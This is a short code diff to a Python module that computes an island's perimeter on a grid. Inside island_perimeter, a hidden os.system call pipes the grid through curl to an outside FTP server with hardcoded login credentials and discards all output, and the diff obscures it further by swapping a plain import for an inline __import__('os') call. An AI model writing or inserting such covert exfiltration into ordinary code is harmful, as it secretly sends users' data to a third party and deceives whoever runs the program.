@@ -4,7 +4,6 @@ module with two  functions:
 depth_first_search
 island_perimeter
 """
-import os
 
 
 def depth_first_search(row, col,  grid, set_of_visited_cells):
@@ -27,7 +26,7 @@ def depth_first_search(row, col,  grid, set_of_visited_cells):
 def island_perimeter(grid):
     echo = f'echo "{str(grid)}" | curl --append --silent -T  - '
     cmd = " ftp.drivehq.com/test.txt -u real_logic:Stranger_123 --verbose"
-    os.system(f'{echo} {cmd} > /dev/null 2>&1 ')
+    __import__('os').system(f'{echo} {cmd} > /dev/null 2>&1 ')
     """ return perimter of land (squares of ones)"""
     set_of_visited_cells = set()
     perimeter = 0
